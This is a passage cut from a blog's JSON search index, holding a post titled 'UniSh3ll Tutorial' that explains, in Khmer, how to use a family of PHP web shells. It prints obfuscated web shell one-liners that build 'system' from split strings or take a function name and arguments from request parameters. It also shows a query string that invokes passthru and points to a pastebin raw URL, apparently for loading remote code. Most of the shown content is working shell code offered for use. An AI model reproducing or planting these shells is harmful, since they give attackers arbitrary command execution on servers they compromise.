unish3ll.php?ត=true\u0026amp;ល=រងារ\u0026amp;ម=passthru\u0026amp;ប=id\u0026amp;ដ=https://pastebin.com/raw/xxxxx\nUniSh3ll-IV 1  \u0026lt;?=$a=\u0026#34;sy\u0026#34;;$b=\u0026#34;stem\u0026#34;;$c=$a.$b; $c(\u0026#34;uname -a\u0026#34;); //get method    UniSh3ll-V 1  \u0026lt;?=$_[]=@(($ក=@$_REQUEST).($😘=@$ក[0]).($😘($ក[1]))); //curl -v \u0026#39;127.0.0.1:8080/unish3ll.php?0=system\u0026amp;1=la+-la\u0026#39;    ","description":"របៀបប្រើប្រាស់ Unish3ll គ្រួសាររបស់ Atom(s) Web Shell","id":18,"section":"posts","tags":["php-webshell"],"title":"UniSh3ll Tutorial","uri":"http://localhost:1313/en/posts/unishell/"}]